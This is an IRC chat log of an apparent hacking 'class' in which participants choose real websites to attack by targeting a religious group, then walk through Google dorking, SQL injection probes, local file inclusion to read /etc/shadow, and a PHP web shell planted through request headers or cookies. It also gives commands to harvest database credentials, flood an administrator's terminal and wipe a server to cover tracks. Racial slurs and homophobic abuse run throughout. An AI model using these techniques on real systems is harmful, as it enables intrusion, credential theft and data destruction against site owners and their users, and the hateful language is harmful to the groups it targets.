Jun 10 21:00:29 <TylerDurden>	let's continue.
Jun 10 21:00:42 <TylerDurden>	We are going to attack live servers in this talk. It is adviced you use a proxy.
Jun 10 21:00:59 <TylerDurden>	If you inted to do any of this without one, please just go to the local police station and hand yourself in, it'll be less hassle.
Jun 10 21:01:47 <Mutiny>	I think he went to turn himself in.
Jun 10 21:01:56 <TylerDurden>	There are a few firefox addons you will need. ServerSpy, LiveHttpheaders, Hackbar.
Jun 10 21:02:22 <TylerDurden>	Install them as i'm going to assume you have them.
Jun 10 21:02:52 <TylerDurden>	Ok, so let's say you have a group of lulzy individuals you want to troll.
Jun 10 21:03:01 *	TylerDurden sets mode -m #school4lulz
Jun 10 21:03:07 <TylerDurden>	i'm taking suggestions for targets.
Jun 10 21:03:17 <z3rod4ta>	chinese

Jun 10 21:03:35 <TylerDurden>	LordKitsuna: contains no dox.
Jun 10 21:03:35 <kratos>	any cp site
Jun 10 21:03:36 <LordKitsuna>	for testing
Jun 10 21:03:40 <LordKitsuna>	oh
Jun 10 21:03:48 <TylerDurden>	anything with >20k users will do.
Jun 10 21:03:52 <LordKitsuna>	xboxlive.com
Jun 10 21:04:01 <TylerDurden>	lol.
Jun 10 21:04:07 <TylerDurden>	i dont have a week to explain this
Jun 10 21:04:12 <TransfiniteGreyWizard>	Too big
Jun 10 21:04:17 <TylerDurden>	ok, a GROUP OF PEOPLE that would be lulzy to attack.
Jun 10 21:04:20 <llama>	LordKitsuna, is your test server back up?
Jun 10 21:04:23 <TylerDurden>	i'll find the target sites.
Jun 10 21:04:31 <LordKitsuna>	llama, never went down
Jun 10 21:04:38 <TylerDurden>	ok.
Jun 10 21:04:41 <TylerDurden>	good old christians then?

Jun 10 21:04:49 <adh>	why not
Jun 10 21:04:51 <Mutiny>	godhatesfags.com
Jun 10 21:04:58 *	TylerDurden sets mode +m #school4lulz
Jun 10 21:05:02 <TylerDurden>	ok, we have a target, christians.
Jun 10 21:05:11 <TylerDurden>	Now we're going to scope out easy sites, the n00b way.
Jun 10 21:05:25 <TylerDurden>	google: christians inurl:.php? inurl:id=
Jun 10 21:05:44 <TylerDurden>	this is passive info gathering, as long as you use a proxy admins will not notice this.
Jun 10 21:05:45 <LordKitsuna>	http://www.intoleranceagainstchristians.eu/index.php?id=243
Jun 10 21:06:00 <TylerDurden>	too small.
Jun 10 21:06:58 <TylerDurden>	http://www.ourkids.net/school/school-profile.php?id=35%27 i have found a cool target already.
Jun 10 21:07:14 <Dox>	c++ grammar http://weegen.home.xs4all.nl/eelis/cppgrammar.png
Jun 10 21:07:21 <z3rod4ta>	http://www.jetzt-tv.net/index.php?id=christianmeyer
Jun 10 21:07:58 <TylerDurden>	Now we have a target.
Jun 10 21:08:10 <TylerDurden>	Let's first automate the googling it shall we.
Jun 10 21:08:11 <Dox>	who?
Jun 10 21:08:15 <TylerDurden>	We can use google as a webspider.
Jun 10 21:08:20 <TylerDurden>	http://www.ourkids.net/school/school-profile.php?id=35%27
Jun 10 21:08:51 <TylerDurden>	Google can search by site. site:www.ourkids.net
Jun 10 21:09:14 <TylerDurden>	Google is a pain in the arse to automate. so find a commandline prog to do it.
Jun 10 21:10:16 <TylerDurden>	luckily, we can use a google scraper for this.
Jun 10 21:10:21 <TylerDurden>	http://www.scroogle.org/cgi-bin/nbbw.cgi
Jun 10 21:11:00 <Dox>	http://www.scroogle.org/cgi-bin/nbbw.cgi == down
Jun 10 21:11:00 <z3rod4ta>	lol it said i had use in SSL since i am using tor
Jun 10 21:11:01 <TylerDurden>	Everyone here knows how to use curl right?
Jun 10 21:11:25 <z3rod4ta>	no curl here
Jun 10 21:11:40 <TylerDurden>	fuck, got wget?
Jun 10 21:12:14 <z3rod4ta>	no but keep going
Jun 10 21:13:04 <TylerDurden>	ok. we have an easy target, we have google.
Jun 10 21:13:12 <TylerDurden>	fuck autom8ing this step then.
Jun 10 21:13:18 <TylerDurden>	WE'LL DO IT BY HAND.
Jun 10 21:13:47 <Dox>	FUCK IT, WE'LL DO IT LIVE
Jun 10 21:13:54 <TylerDurden>	http://www.google.com/search?q=site%3Aourkids.net see that it finds all pages related to that site?
Jun 10 21:13:57 <TylerDurden>	right.
Jun 10 21:14:07 <TylerDurden>	now that we know how to find SQLI, as in the earlier tutorial.
Jun 10 21:14:11 <TylerDurden>	we can find vulnerable pages.
Jun 10 21:14:14 <TylerDurden>	holler at me.
Jun 10 21:14:56 <Dox>	http://www.ourkids.net/camp/ ??
Jun 10 21:15:11 <Dox>	Has a form at the bottom
Jun 10 21:15:12 <TylerDurden>	http://www.ourkids.net/school/school-gallery-image.php?id=6&image=3040%27
Jun 10 21:15:16 <Mutiny>	Tor button doesn't work with firefox 4 still >:(
Jun 10 21:15:18 <Dox>	with submit button
Jun 10 21:15:29 <TylerDurden>	Mutiny: download the GIT version.
Jun 10 21:15:34 <TylerDurden>	Dox: exactly
Jun 10 21:15:39 <TylerDurden>	we are looking for any kind of input
Jun 10 21:15:45 <TylerDurden>	in the url, or in forms.
Jun 10 21:15:51 <TylerDurden>	In case you fags didn't notice that.
Jun 10 21:15:58 <TylerDurden>	Now we are going to give it SQL related input.
Jun 10 21:16:05 <TylerDurden>	' or 1=1;-- etc.
Jun 10 21:16:10 <TylerDurden>	i prefer to use and myself.
Jun 10 21:16:12 <Dox>	What kind of MySQL code are we going to use?
Jun 10 21:16:22 <TylerDurden>	Dox: mainly load_file.
Jun 10 21:16:26 <z3rod4ta>	http://www.ourkids.net/calendar/event_calendar_month.php
Jun 10 21:16:27 <TylerDurden>	ok.
Jun 10 21:16:34 <Dox>	idk load_fire
Jun 10 21:16:44 <TylerDurden>	so you know how to find a bunch of vulnerable urls, and how to find SQLI.

Jun 10 21:17:35 <TylerDurden>	ok.
Jun 10 21:17:40 <Mutiny>	oh ty
Jun 10 21:18:00 <TylerDurden>	this is neither high tech nor advanced.
Jun 10 21:18:05 <TylerDurden>	but it's how you can rape sony.
Jun 10 21:18:46 <TylerDurden>	tsocks curl http://www.ourkids.net/robots.txt -> 404
Jun 10 21:18:50 <TylerDurden>	we're now going to make a bash script with default shit to gather.
Jun 10 21:19:02 <TylerDurden>	robots.txt contains shit admins want to hide from search engines.
Jun 10 21:19:12 <TylerDurden>	since we use google as a spider, that's shit we have to search trough by hand.
Jun 10 21:19:24 <TylerDurden>	(which we're not going today)
Jun 10 21:19:29 <TylerDurden>	type vim niggers.sh or something like it.
Jun 10 21:21:06 <TylerDurden>	tsocks curl -I http://www.ourkids.net/robots.txt 
Jun 10 21:21:10 <TylerDurden>	see the output of that command?

Jun 10 21:21:43 <TylerDurden>	everyone with me?>
Jun 10 21:22:07 <z3rod4ta>	no, where the fuck are you typing those commands at?
Jun 10 21:22:13 <TylerDurden>	godammit.
Jun 10 21:22:16 <TylerDurden>	a fucking terminal.
Jun 10 21:22:21 <z3rod4ta>	at nigges.sh script?
Jun 10 21:22:34 <z3rod4ta>	ok
Jun 10 21:22:47 <TylerDurden>	just to test it.
Jun 10 21:22:53 <TylerDurden>	you will put them in niggers.sh later.
Jun 10 21:23:01 <z3rod4ta>	ight
Jun 10 21:23:08 <TylerDurden>	i assume you are either using a goddamn window manager or terminal multiplexer.

Jun 10 21:36:25 <TylerDurden>	protip: if you don't know firefox->view source.
Jun 10 21:37:11 <TylerDurden>	in general, any line with "version" in it might be important.

Jun 10 21:37:48 <zone>	grep + sed?
Jun 10 21:38:01 <TylerDurden>	exactly.

Jun 10 21:44:29 <Dox>	zone, they would have to come here to learn. homeboy has no skill

Jun 10 21:47:10 <zone>	but that would pull out a shitload of info

Jun 10 21:47:26 <TylerDurden>	exactly.
Jun 10 21:49:01 <LordKitsuna>	what more info/= better ?
Jun 10 21:49:13 <TylerDurden>	no.
Jun 10 21:50:16 <z3rod4ta>	no because we are only checking for robot.txt
Jun 10 21:50:21 <z3rod4ta>	correct?

Jun 10 21:50:56 <z3rod4ta>	got it.

Jun 10 21:52:28 <TylerDurden>	http://pastebin.com/z36pbYuf
Jun 10 21:52:39 <TylerDurden>	that's already a bit of info, not?
Jun 10 21:52:42 <zone>	I didnt did this one but works
Jun 10 21:52:44 <TylerDurden>	a 404 might give more info.
Jun 10 21:52:47 <z3rod4ta>	TylerDurden: when running niggers.sh after chmod +x where would that output the info?
Jun 10 21:52:53 <zone>	tsocks curl --silent -I http://www.ourkids.net/robots.txt | grep Server | sed 's/ /\n/g' | grep Apache
Jun 10 21:52:55 <TylerDurden>	stdout.
Jun 10 21:53:15 <TylerDurden>	a 404 page would get us more info, not?>
Jun 10 21:53:20 <zone>	aye
Jun 10 21:53:44 <TylerDurden>	well, let's CURL a 404 page!
Jun 10 21:54:24 <TylerDurden>	ok, except for a 404, we're going to curl for ws_ftp logs.
Jun 10 21:54:42 <TylerDurden>	we might as well try to get the source to index.php with a ngix null byte exploit
Jun 10 21:54:45 <LordKitsuna>	a 404 is just any page not found right?
Jun 10 21:54:49 <TylerDurden>	yup.
Jun 10 21:54:55 <LordKitsuna>	oh then we can just be like http://www.ourkids.net/sdfsdfksdgfskdjfhasdadioashdsi

Jun 10 21:57:43 <TylerDurden>	for instance that with $1=stallman.org gives us his apache version.

Jun 10 21:58:23 <TylerDurden>	no.
Jun 10 21:58:28 <LordKitsuna>	watch as this site is somehow really well secured, id laugh
Jun 10 21:58:39 <TylerDurden>	oh it isnt.

Jun 10 21:59:34 <zone>	TylerDurden, how to make cases?
Jun 10 21:59:38 <zone>	Case apache
Jun 10 21:59:42 <zone>	Case nginx
Jun 10 21:59:45 <zone>	Case whatever
Jun 10 22:00:02 <TylerDurden>	basically set a numeric flag
Jun 10 22:00:17 <TylerDurden>	| grep "Apache" && myCase=1
Jun 10 22:00:22 <TylerDurden>	then work from myCase on
Jun 10 22:00:26 <TylerDurden>	but that's not really usefull here.

Jun 10 22:07:46 <TylerDurden>	that's how you determine a phpbb version.
Jun 10 22:07:56 <TylerDurden>	you might also want to grab the copyright line for shits n giggles.
Jun 10 22:11:11 <TransfiniteGreyWizard>	I just heard a politician tell the truth

Jun 10 22:13:08 <LordKitsuna>	that's an assholish way of doing it
Jun 10 22:13:09 <TylerDurden>	http://pastebin.com/7BieznDz this is your script up till now
Jun 10 22:13:10 <LordKitsuna>	highfive
Jun 10 22:13:12 <TylerDurden>	if it's not COPY IT.
Jun 10 22:13:56 <thatsnice>	I have a question
Jun 10 22:14:05 <TylerDurden>	yeah?
Jun 10 22:14:26 <thatsnice>	im not sure if you told it, but what is the point of the robots.txt
Jun 10 22:14:26 <xRay>	TylerDurden the methods you've used work to an extent but with something like lighthttpd it may just redirect invalid links to the main page.. If you get that your best bet is exec nmap -sV -p 80 www.site.com
Jun 10 22:14:35 <haut>	Why waste so much bandwidth for just one target
Jun 10 22:14:40 <thatsnice>	i might not have been here when you explained it
Jun 10 22:14:54 <xRay>	Some times people put admin dir's in the robots.txt thinking it will stop it showing up in google.
Jun 10 22:14:55 <adh>	Websites use robots.txt as instructions for search engines, what to include/exclude from search results
Jun 10 22:14:56 <haut>	thatsnice: it's used to tell webspiders to exclude certain directories
Jun 10 22:15:06 <haut>	thatsnice: like, tell the googlebot to not index that stuff
Jun 10 22:15:20 *	LordKitsuna sets mode +m #school4lulz
Jun 10 22:15:26 <LordKitsuna>	too much stuff need to read it all
Jun 10 22:15:28 <TylerDurden>	xRay: i know, but we dont want to nmap just yet.
Jun 10 22:15:35 <TylerDurden>	xRay: nmap is more intrusive than a 404
Jun 10 22:15:45 *	LordKitsuna sets mode -m #school4lulz
Jun 10 22:15:46 <LordKitsuna>	k
Jun 10 22:15:51 <xRay>	Yeah that's true
Jun 10 22:16:04 <TylerDurden>	ok, the point of this is INFORMATION GATHERING PEOPLE.
Jun 10 22:16:13 <TylerDurden>	you want to be AS SILENT AS POSSIBLE.
Jun 10 22:16:18 <TylerDurden>	if possible USE GOOGLE TO GET THE INFO
Jun 10 22:16:31 <TylerDurden>	also: google translate is a good proxy.
Jun 10 22:16:32 <TylerDurden>	:P
Jun 10 22:16:37 <adh>	haha
Jun 10 22:16:58 <bob_22>	Thanks for the class Tyler, gotta crash. paste it up somewhere. 
Jun 10 22:16:59 <LordKitsuna>	TylerDurden, would using Google translator make it look like its google grabbing shit on the server end? (i dont know shit so forgive me if thigns i say are stupid)
Jun 10 22:17:04 <LordKitsuna>	of
Jun 10 22:17:05 <LordKitsuna>	oh
Jun 10 22:17:10 <LordKitsuna>	damnit you said that as i was typing
Jun 10 22:17:17 <LordKitsuna>	nvm
Jun 10 22:17:20 <s4>	I missed everything, a paste would be nice :)
Jun 10 22:17:37 <TylerDurden>	yes it would:P
Jun 10 22:17:47 <TylerDurden>	that's why i use it.
Jun 10 22:17:56 <z3rod4ta>	s4 i think the class will posted at pastbin after its done.
Jun 10 22:18:00 <TylerDurden>	you see, webmasters expect google in their logs.
Jun 10 22:18:06 *	TylerDurden sets mode +m #school4lulz
Jun 10 22:18:14 <TylerDurden>	so google won't stand out too much.
Jun 10 22:18:20 <TylerDurden>	this is why google translate as a proxy is a good idea.
Jun 10 22:18:33 <TylerDurden>	let's factor in a way to do this easily into our script, shall we?
Jun 10 22:18:37 <TylerDurden>	we make a generic getpage function.
Jun 10 22:22:47 <TylerDurden>	http://pastebin.com/N0EXahxR your script up till now.
Jun 10 22:23:38 <TylerDurden>	as you might have noticed, i grabbed the phpbb copyright line too real quick.
Jun 10 22:23:45 <TylerDurden>	if you can't find any real info, use the copyright line.
Jun 10 22:23:50 <TylerDurden>	it at least gives you a year in which it was built.
Jun 10 22:24:22 <TylerDurden>	invision pro boards are another usual target.
Jun 10 22:27:25 <Mutiny>	it kind of makes me nervous seeing some of the files I do... :-/

Jun 10 22:28:28 <TylerDurden>	hehe.
Jun 10 22:28:41 <TylerDurden>	some .govs have mad robots.txt files too.

Jun 10 22:28:48 <TylerDurden>	the goal is to automate this shit.
Jun 10 22:28:48 <z3rod4ta>	TylerDurden: will this be posted later, need to get my kid into bed
Jun 10 22:28:48 <Mutiny>	haha
Jun 10 22:29:00 <TylerDurden>	z3rod4ta: i
Jun 10 22:29:06 <TylerDurden>	i'm sure someone is copying it.
Jun 10 22:29:21 <Mutiny>	If not I can always go back
Jun 10 22:29:34 <Mutiny>	at least until I close the window XD
Jun 10 22:29:43 <LordKitsuna>	my client logs everything so if its not posted i can go back and grab it
Jun 10 22:29:50 <TylerDurden>	k.
Jun 10 22:29:56 <TylerDurden>	i keep no logs for obvious reasons.
Jun 10 22:29:58 <z3rod4ta>	than have a good night guys
Jun 10 22:30:00 <TylerDurden>	now, back to the code.
Jun 10 22:30:11 <LordKitsuna>	TylerDurden, cus of all the porn?
Jun 10 22:31:40 <Mutiny>	haha intitle:index.of.porn is pretty entertaining

Jun 10 22:34:45 <Mutiny>	It is isn't it?
Jun 10 22:34:53 <LordKitsuna>	i could so do that too
Jun 10 22:34:59 <LordKitsuna>	i have the tools/extra wood
Jun 10 22:35:00 <garrett>	Perl can help me iterate over the cocks in a given stall, mark each as sucked or unsucked and sort them by length.  Then I can be gay with piss and go home and take a nap.

Jun 10 22:36:29 <hatter>	<3 garrett 
Jun 10 22:36:42 <TylerDurden>	so, what we're doing is finding version dorks for a lot of pieces of software.

Jun 10 22:37:19 <hatter>	lol
Jun 10 22:37:19 <hatter>	wow
Jun 10 22:37:26 <hatter>	why not just teach fuzzing tyler?
Jun 10 22:37:35 <hatter>	and then exploitation
Jun 10 22:37:41 <hatter>	and how to analyze inputs
Jun 10 22:37:51 <TylerDurden>	because: n00bs.
Jun 10 22:38:00 <LordKitsuna>	tyler would loose money if he did that
Jun 10 22:38:02 <hatter>	I think they can keep up
Jun 10 22:38:06 <TylerDurden>	ok.
Jun 10 22:38:08 <TylerDurden>	well then
Jun 10 22:38:12 <TylerDurden>	let's skip to fuzzing.
Jun 10 22:38:20 <TylerDurden>	i assume you can all just fucking figure the google dorks out by now.
Jun 10 22:38:26 <TylerDurden>	and copy paste a line in your bash script for every one.
Jun 10 22:38:35 <TylerDurden>	add nmap and a few more things in there.
Jun 10 22:38:37 <TylerDurden>	ok.
Jun 10 22:38:39 <TylerDurden>	up to fuzzing.
Jun 10 22:38:46 <hatter>	lol.  I meant web app fuzzing.
Jun 10 22:38:53 <TylerDurden>	hatter: i know.
Jun 10 22:39:05 <TylerDurden>	hatter: easiest way is adding a quote.
Jun 10 22:39:10 <TylerDurden>	then using diff.
Jun 10 22:39:24 <hatter>	not always accurate though.
Jun 10 22:39:28 <TylerDurden>	no.
Jun 10 22:39:29 <TylerDurden>	Ok
Jun 10 22:39:37 <TylerDurden>	here's a step by step plan for web app fuzzing.
Jun 10 22:39:44 <TylerDurden>	See if you can add a single quote, and if shit breaks then.
Jun 10 22:39:49 <TylerDurden>	See if you can add a double quote and if shit breaks then.
Jun 10 22:39:55 <TylerDurden>	See if you can add a null byte and if shit breaks then.
Jun 10 22:40:05 <TylerDurden>	If one of these conditions changes the current page.
Jun 10 22:40:11 <TylerDurden>	You check if it's a numeric or string field.
Jun 10 22:40:16 <TylerDurden>	And apply SQLI conditions to it.
Jun 10 22:40:16 <hatter>	check out a spacebar too.
Jun 10 22:40:22 <hatter>	or a +
Jun 10 22:40:27 <TylerDurden>	or a -1
Jun 10 22:40:32 <hatter>	sometimes stuff gets sanitized, but not all of it
Jun 10 22:40:41 <TylerDurden>	But since we've covered SQL, let's write a fuzzer.
Jun 10 22:40:44 <hatter>	the best way to be secure is by whitelisting characters.
Jun 10 22:41:10 <TylerDurden>	regex.
Jun 10 22:41:18 <hatter>	delete anything that doesn't fit the criteria.
Jun 10 22:41:21 <TylerDurden>	Ok. but we're here for offensive shit.
Jun 10 22:41:23 <hatter>	what TylerDurden said
Jun 10 22:41:32 <hatter>	Regex applies to that
Jun 10 22:41:48 <TylerDurden>	regex is a one line fix, writing a fuzzer is a 20 lines program;)
Jun 10 22:41:54 <TylerDurden>	ok. to fuzz shit, we need to know what to fuzz.
Jun 10 22:42:02 <TylerDurden>	web forms and urls are the easiest
Jun 10 22:42:05 <TylerDurden>	let's just start with urls.
Jun 10 22:42:18 <TylerDurden>	how the fuck do we get fuzzable urls?
Jun 10 22:42:28 <TylerDurden>	a fuzzable url has some kind of goddamn parameter in it.
Jun 10 22:42:38 <TylerDurden>	you can bet your ass there's an equal sign in there somewhere.
Jun 10 22:45:51 <TylerDurden>	fuck, phone call.
Jun 10 22:45:53 <hatter>	not only that
Jun 10 22:45:57 <hatter>	Sometimes
Jun 10 22:46:03 <hatter>	you've seen those "clean urls"
Jun 10 22:46:18 <hatter>	that just have /something/somethingelse/numberordate
Jun 10 22:46:29 <hatter>	those are usually parameters to those equal signs
Jun 10 22:46:37 <hatter>	the variables are just hiding
Jun 10 22:46:50 <hatter>	a lot of times its part of an MVC application if the URL's are clean
Jun 10 22:46:57 <hatter>	null bytes, single quotes, etc are awesome
Jun 10 22:47:12 <hatter>	sometimes, none of them will show up though, if they're using a non-utf8 charset
Jun 10 22:47:19 <hatter>	meaning multi-byte encodings are possible
Jun 10 22:47:27 <hatter>	the addslashes() function, in php for example
Jun 10 22:47:34 <hatter>	is vulnerable if using a multibyte platofrm
Jun 10 22:47:50 <hatter>	a quote, aka "%27"
Jun 10 22:47:58 <hatter>	won't change anything
Jun 10 22:48:04 <hatter>	but %bf%27 will
Jun 10 22:48:32 <hatter>	because when there's addslashes(), it tries to escape the quote.
Jun 10 22:48:40 <hatter>	the \ is a \x5c
Jun 10 22:48:45 <hatter>	%5c
Jun 10 22:49:00 <hatter>	the characters %bf%27 aren't multibyte
Jun 10 22:49:10 <hatter>	but %bf%5c%27 are
Jun 10 22:49:21 <hatter>	so when the sanitizing occurs, you escape the single quote
Jun 10 22:49:28 <hatter>	and you have another fuzzing method
Jun 10 22:49:46 <t>	zomg guys they got an uncorrupted hard drive
Jun 10 22:49:47 <t>	!!!
Jun 10 22:49:56 *	hatter gives voice to TR0|\|
Jun 10 22:50:20 <TylerDurden>	do you guys want to see how to write an actual fuzzer, or are you man enough to lern by hand.
Jun 10 22:50:30 <hatter>	they gotta learn by hand
Jun 10 22:50:34 <hatter>	before they can write it
Jun 10 22:50:51 <TylerDurden>	well then.
Jun 10 22:50:56 <TylerDurden>	what was our tutorial site again?;)
Jun 10 22:51:05 <hatter>	tutorial site?
Jun 10 22:51:05 <LordKitsuna>	japfap.ath.cx

Jun 10 22:54:40 <LordKitsuna>	they had a reverse shell on the site at one point
Jun 10 22:54:51 <LordKitsuna>	but i got rid of that at some point
Jun 10 22:55:56 <hatter>	lol
Jun 10 22:56:02 *	t gives channel half-operator status to Dox
Jun 10 22:56:08 <TylerDurden>	ok.
Jun 10 22:56:13 <TylerDurden>	basic way to test for LFI guise.
Jun 10 22:56:21 <TylerDurden>	say you have a page with include=autism.txt
Jun 10 22:56:35 <hatter>	lol
Jun 10 22:56:39 <TylerDurden>	and you are in directory /admin/fail.php?include=autism.txt
Jun 10 22:56:41 <hatter>	pretty much
Jun 10 22:56:44 <TylerDurden>	and you are in directory /admin/fail.php?include=../admin/autism.txt
Jun 10 22:56:54 <TylerDurden>	does that werk?
Jun 10 22:56:57 <TylerDurden>	if yes: lfi.

Jun 10 22:57:48 <TylerDurden>	if yes: lfi
Jun 10 22:57:53 <TylerDurden>	now: a filesystem has a path limit.
Jun 10 22:57:59 <TylerDurden>	that path limit is usually 255 characters.
Jun 10 22:58:03 <TylerDurden>	sometimes null bytes do not work.

Jun 10 22:58:11 <TylerDurden>	so we can increase the directory traversal length by one letter each time untill we hit the path limit.
Jun 10 22:58:14 <LordKitsuna>	Fox, so im the pastebinner? kk just highlight me agaibn when done
Jun 10 22:58:17 <TylerDurden>	and voilla, we dont need a null byte anymore.
Jun 10 22:58:31 <TylerDurden>	once you have a lfi, you can get a passwords file.
Jun 10 22:58:35 <TylerDurden>	passwords files are shit useless.
Jun 10 22:58:44 <TylerDurden>	/etc/shadow is where the party is at.
Jun 10 22:58:58 <TylerDurden>	you can however include /proc/self/environ or the like
Jun 10 22:59:08 <TylerDurden>	this shows your http request in the website's page.
Jun 10 22:59:09 <TylerDurden>	cool.
Jun 10 22:59:10 <Mutiny>	http://www.sparkynet.com/turtle/etc/passwd There isn't a /etc/shadow here :-(
Jun 10 22:59:22 <TylerDurden>	this INCLUDES your http request in it.
Jun 10 22:59:34 <TylerDurden>	wait.
Jun 10 22:59:37 <TylerDurden>	it includes it?
Jun 10 22:59:40 <TylerDurden>	fullretard.jpg.exe.tiff
Jun 10 22:59:56 <TylerDurden>	now you can drop a php shell in your useragent for instance
Jun 10 22:59:58 <hatter>	loool
Jun 10 23:00:01 <TylerDurden>	preferably you put a php shell in your post data.
Jun 10 23:00:08 <TylerDurden>	because post data usually doesn't get logged.
Jun 10 23:00:12 <xochipilli>	or cookie
Jun 10 23:00:13 <hatter>	or cookie data
Jun 10 23:00:16 <xochipilli>	heh
Jun 10 23:00:17 <hatter>	lol
Jun 10 23:00:18 <hatter>	xochipilli: <3
Jun 10 23:00:20 <TylerDurden>	so, you put a php shell in post or cookie.
Jun 10 23:00:21 <xochipilli>	<3
Jun 10 23:00:44 <Fox>	 /away
Jun 10 23:00:46 <Fox>	you all be good
Jun 10 23:00:46 <Fox>	:3
Jun 10 23:01:16 <hatter>	kk
Jun 10 23:01:21 <TylerDurden>	<? system($_POST[penis]);exit; ?>
Jun 10 23:01:21 <xochipilli>	nn
Jun 10 23:01:27 <TylerDurden>	that's an example of a php shell.
Jun 10 23:01:28 <TylerDurden>	it's that easy.
Jun 10 23:01:33 <xochipilli>	do u rly need the exit?
Jun 10 23:01:37 <hatter>	you don't even rly need exit
Jun 10 23:01:38 <TylerDurden>	ya.
Jun 10 23:01:41 <hatter>	nah
Jun 10 23:01:42 <TylerDurden>	ya u do.
Jun 10 23:01:42 <hatter>	you dont
Jun 10 23:01:44 <hatter>	lol
Jun 10 23:01:45 <xochipilli>	^
Jun 10 23:01:56 <TylerDurden>	technically you could screw the output/break off the send in the next line.
Jun 10 23:02:02 <TylerDurden>	so technically you need exit;)
Jun 10 23:02:06 <hatter>	no.
Jun 10 23:02:22 <hatter>	if you're executing a system call
Jun 10 23:02:26 <hatter>	it returns when the call ends.
Jun 10 23:02:37 <hatter>	so when the normal app ends, even if its only one command
Jun 10 23:02:39 <hatter>	it returns 0
Jun 10 23:02:43 <hatter>	like we learned in assembly class
Jun 10 23:03:07 <hatter>	So the process just ends like it would with exit.
Jun 10 23:03:24 <TylerDurden>	heh. k.
Jun 10 23:03:30 <TylerDurden>	i never did much php:P
Jun 10 23:03:39 <TylerDurden>	can rape it pretty well tough
Jun 10 23:03:49 <hatter>	same.
Jun 10 23:03:50 <hatter>	lol
Jun 10 23:04:00 <TylerDurden>	ok. so now you've got a php shell.
Jun 10 23:04:03 <TylerDurden>	that's cute
Jun 10 23:04:27 <hatter>	start looking at files & runnin decent commands
Jun 10 23:04:36 <TylerDurden>	you can for instance read db files, install a user backdoor.
Jun 10 23:04:37 <TylerDurden>	check the user you're logged in, see if the fucktard has a bash_history
Jun 10 23:04:58 <hatter>	find -name \*conf\* -exec grep -i "user\|database\|host" '{}' \;
Jun 10 23:05:00 <TylerDurden>	but since you got in trough lfi anyways, chances are the security is shit.
Jun 10 23:05:21 <TylerDurden>	so try uname -a
Jun 10 23:05:29 <TylerDurden>	it shows the day the kernel was compiled, and which version it's running.
Jun 10 23:05:40 <TylerDurden>	old kernel = fail kernel = probably exploitable.
Jun 10 23:06:09 <hatter>	not always.
Jun 10 23:06:09 *	TylerDurden gives voice to whiteh8
Jun 10 23:06:17 <hatter>	depends on where you see it
Jun 10 23:06:24 <hatter>	if its a big static probably modified build
Jun 10 23:06:26 <hatter>	stay away
Jun 10 23:06:29 <hatter>	you're being logged
Jun 10 23:06:30 <hatter>	lol
Jun 10 23:06:37 <TylerDurden>	find / -type f -perm 0777 <-find writable folders.
Jun 10 23:06:43 <hatter>	and executable
Jun 10 23:07:03 <hatter>	not all writable folders can be written to
Jun 10 23:07:11 <hatter>	with applications
Jun 10 23:07:11 <TylerDurden>	not by YOU anyways.
Jun 10 23:07:13 <TylerDurden>	:P
Jun 10 23:07:15 <hatter>	and still have the applications work
Jun 10 23:07:33 <hatter>	you could try chmod
Jun 10 23:07:36 <TylerDurden>	so the first thing you want to do is get a writable folder.
Jun 10 23:07:36 <hatter>	but that might not always work
Jun 10 23:07:44 <TylerDurden>	you could also see if you're allowed to make device nodes in a folder;)
Jun 10 23:07:47 <hatter>	with execute permissions
Jun 10 23:07:53 *	Dox is now known as Dox_
Jun 10 23:07:59 <hatter>	mknod :D
Jun 10 23:08:02 <Dox_>	night all
Jun 10 23:08:06 <Dox_>	night hatter
Jun 10 23:08:08 <TylerDurden>	night dox.
Jun 10 23:08:10 <hatter>	night
Jun 10 23:08:28 <TylerDurden>	ok, mknod + setting permissions is pretty win too.
Jun 10 23:08:33 <hatter>	^
Jun 10 23:08:42 <TylerDurden>	basically, find shit the admin didn't think of to get around file permissions.
Jun 10 23:09:03 <TylerDurden>	i like setting all my temp directories nonexecutable, no device nodes, and no file listin'.
Jun 10 23:09:19 <TylerDurden>	basic users can only read/write their home dir, and not set execute permissions.
Jun 10 23:09:36 <TylerDurden>	you might also want to prevent them from reading keyboard shite.
Jun 10 23:09:42 <TylerDurden>	or other I/O
Jun 10 23:09:52 <Mutiny>	http://www.larrywseymour.com/robots.txt/robots.txt that's one of the larger robots.txt I've found so far xD
Jun 10 23:10:03 <TylerDurden>	as an attacker, keyboard or other I/O can tell you if there's an admin on the box.
Jun 10 23:10:39 <TylerDurden>	if there's an admin, wait the fuck up and hide till he's gone.
Jun 10 23:11:02 <TylerDurden>	now.
Jun 10 23:11:04 <TylerDurden>	for exploiting high profile sites
Jun 10 23:11:04 <TylerDurden>	YOU ARE MONITORED.
Jun 10 23:11:21 <TylerDurden>	Hence executing shell command MIGHT Not be the best way to do shit.
Jun 10 23:11:29 <TylerDurden>	Myself i prefer using an extendable piece of shellcode.
Jun 10 23:11:35 <TylerDurden>	That is: shell code i can augment with shit i need on the fly.
Jun 10 23:11:58 <TylerDurden>	So before yuo go thinkin' that ssh is the only way, it isn't.
Jun 10 23:12:15 <TylerDurden>	it's actually a pretty fucktarded way, because: logs.
Jun 10 23:12:32 <TylerDurden>	any server worth it's salt is going to have someone that reads the logs.
Jun 10 23:13:02 <hatter>	or if you want to be lolz
Jun 10 23:13:04 <TylerDurden>	In case there's an IDS or more security, there's probably backups of those logs too.
Jun 10 23:13:05 <hatter>	if you see an admin
Jun 10 23:13:10 <hatter>	and you can execute the write command
Jun 10 23:13:18 <t>	execpt sony they obv dnt check shit :P(sorry had to go there)
Jun 10 23:13:19 <hatter>	you can see root logged in with `w'
Jun 10 23:13:39 <hatter>	cat /dev/urandom | write root &
Jun 10 23:13:46 <hatter>	kick that bitch off his terminal
Jun 10 23:13:52 <hatter>	only if you do something like
Jun 10 23:14:36 <TylerDurden>	Anyways, in case you notice that they are running any decent IDS, you pack your shit, rm-rf the server and run.
Jun 10 23:15:04 <hatter>	w|awk '/ro[o]t// {print "cat /dev/urandom | write root "$2" &"}|sh &
Jun 10 23:15:16 <hatter>	w|awk '/ro[o]t/ {print "cat /dev/urandom | write root "$2" &"}|sh &
Jun 10 23:15:17 <hatter>	*
Jun 10 23:15:22 <TylerDurden>	because 99% of the time it isn't worth it to have access to that box, 'cause you wont stay on it for long.
Jun 10 23:15:33 <TylerDurden>	Unless you somehow manage to get a kernel patch onto it;)
Jun 10 23:15:39 <hatter>	^
Jun 10 23:16:03 <TylerDurden>	Kernel patching is awesome, but i suck at it.
Jun 10 23:16:06 <hatter>	that can come in a module, a hook to /dev/kmem, a hook to /proc/cpu/microcode, etc
Jun 10 23:16:09 <TylerDurden>	So i usually just nuke.
Jun 10 23:17:14 <hatter>	passin out.
